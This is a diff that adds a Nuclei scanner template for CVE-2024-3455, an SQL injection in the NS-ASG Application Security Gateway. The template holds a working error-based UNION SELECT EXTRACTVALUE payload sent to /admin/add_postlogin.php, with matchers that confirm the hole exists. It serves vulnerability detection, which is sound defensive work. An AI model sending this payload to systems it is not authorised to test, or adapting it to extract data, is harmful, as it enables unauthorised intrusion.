@@ -1,0 +1,31 @@
+id: CVE-2024-3455
+info:
+  name: Netent NS-ASG Application Security Gateway SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-3455,sqli
+  description: |
+    SQL injection vulnerability in Netent NS-ASG Application Security Gateway, exploitable via the `add_postlogin.php` endpoint.
+
+variables:
+  t1: '{{rand_int(1000,9999)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        GET /admin/add_postlogin.php?SingleLoginId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5({{t1}})),0x7e)) HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - contains(body, t2)
+          - contains(body, "XPATH syntax error")
